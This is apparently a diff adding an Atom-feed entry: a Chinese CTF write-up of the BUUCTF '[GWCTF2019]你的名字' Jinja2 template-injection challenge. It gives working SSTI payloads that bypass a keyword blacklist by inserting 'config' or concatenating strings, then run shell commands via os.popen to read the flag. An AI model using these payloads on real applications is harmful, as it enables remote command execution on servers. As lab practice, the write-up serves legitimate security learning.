@@ -1121,6 +1121,48 @@ echo urlencode(serialize($c));
         <updated>2024-09-23T07:32:41.000Z</updated>
     </entry>
     <entry>
+        <id>http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/</id>
+        <title>[GWCTF2019]你的名字</title>
+        <link rel="alternate" href="http://odiws.github.io/2024/09/22/GWCTF2019-%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/"/>
+        <content type="html">&lt;h2 id=&#34;gwctf2019你的名字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#gwctf2019你的名字&#34;&gt;#&lt;/a&gt; [GWCTF2019] 你的名字&lt;/h2&gt;
+&lt;h2 id=&#34;3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3&#34;&gt;#&lt;/a&gt; &lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/3.png&#34; alt=&#34;3&#34;&gt;&lt;/h2&gt;
+&lt;p&gt;进去就是一个 ssti 经典：好多东西被禁了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;#123;&amp;#125;&amp;#125;，union,select,/,/**/ 
+这是被禁了，会在后面加上！禁了&amp;#123;&amp;#123;&amp;#125;&amp;#125;还以为不是ssti了
+然后就没了，虽然知道了也不会做········
+它用了&amp;#123;%print %&amp;#125;这种形式，这样就能打印出执行信息了
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;试了下&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum %&amp;#125;，
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/4.png&#34; alt=&#34;4&#34;&gt; 终于有回显了，有回显了就好开始下面的构造了&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;这里还得补充一点，&amp;#123;%print %&amp;#125;形式下，若果你构造的payload是正常的ssti用到的语句却没有回显，就说明你的语句中可能有关键字被过滤了，如&amp;#123;%print &#39;&#39;.class %&amp;#125;执行之后没有任何的回显，但&amp;#123;%print &#39;&#39;.clconfigass %&amp;#125;成功执行有回显，这说明class被过滤了
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;本体的黑名单源代码：&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;../../../../AppData/Roaming/Typora/typora-user-images/image-20240922205525074.png&#34; alt=&#34;image-20240922205525074&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这过滤代码挺傻的，是先从黑名单中取出一个字符串经过循环过滤再进行下一个字符串的过滤，因为 config 字符串是在黑名单的最后一个，所以黑名单中前面字符串的过滤都已经结束了，再进行 config 的过滤，所以我们在过滤字符中加入 config 就可以绕过&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;所以最终的 payload 可以写成如下形式&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum.__globals__.__builconfigtins__.__impoconfigrt__(&#39;oconfigs&#39;).poconfigpen(&#39;whoami&#39;).read()%&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;也可以拼接绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;%print lipsum.__globals__[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;__im&#39;+&#39;port__&#39;](&#39;o&#39;+&#39;s&#39;)[&#39;po&#39;+&#39;pen&#39;](&#39;whoami&#39;).read()%&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最后的 payload:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;#123;%set a=&#39;__bui&#39;+&#39;ltins__&#39;%&amp;#125;
+&amp;#123;%set b=&#39;__im&#39;+&#39;port__&#39;%&amp;#125;
+&amp;#123;%set c=&#39;o&#39;+&#39;s&#39;%&amp;#125;
+&amp;#123;%set d=&#39;po&#39;+&#39;pen&#39;%&amp;#125;
+&amp;#123;%print(lipsum[&#39;__globals__&#39;][a][b](c)[d](&#39;cat /flag_1s_Hera&#39;)[&#39;read&#39;]())%&amp;#125;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;**用&amp;#123;%print %&amp;#125;解决了回显问题，网上的其他大多数文章为了解决无法回显的问题大多是选择外带的形式**
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&#34;../images/%5BGWCTF2019%5D%E4%BD%A0%E7%9A%84%E5%90%8D%E5%AD%97/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
+</content>
+        <category term="buuctf" />
+        <category term="ssti" />
+        <updated>2024-09-22T12:40:09.000Z</updated>
+    </entry>
+    <entry>
         <id>http://odiws.github.io/2024/09/09/2020-Hurdles/</id>
         <title>2020]Hurdles</title>
         <link rel="alternate" href="http://odiws.github.io/2024/09/09/2020-Hurdles/"/>
